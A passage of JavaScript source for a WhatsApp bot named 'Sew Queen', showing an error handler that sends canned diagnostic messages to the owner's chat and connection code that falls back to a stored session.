                                        '\n*Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
                                        '\n*Solution:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ ERROR ANALYSIS [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ ERROR ANALYSIS [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ ERROR ANALYSIS [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Bailyes Action Error_ ' +
                                        '\n*Reason:* _The exact reason is unknown. More than one option may have triggered this error._' +
                                        '\n*Solution:* _If you use it again, it may improve. If the error continues, you can try to restart._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ ERROR ANALYSIS [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Cannot Decode Text or Media_' +
                                        '\n*Reason:* _Incorrect use of the plug._' +
                                        '\n*Solution:* _Please use the commands as written in the plugin description._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await QSew.sendMessage(QSew.user.jid, '*🧟‍♂️ ERROR ANALYSIS [Sew Queen] 🧟‍♀️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Word Character Usage_' +
                                        '\n*Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin alphabet.._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await QSew.sendMessage(QSew.user.jid, '*🙇🏻 Sorry, I Couldnt Read This Error! 🙇🏻*' +
                                        '\n_You can write to our support group for more help._'
                                        , MessageType.text
                                    );
                                }    
                            }
                        }
                    }
                }
            }
        )
    });

    try {
        await QSew.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Loading Old Version Session...'))
            QSew.loadAuthInfo(Session.deCrypt(Raviya.SESSION)); 
            try {
                await QSew.connect();
            } catch {
                return;
            }
        }
    }
}

sewQueen();
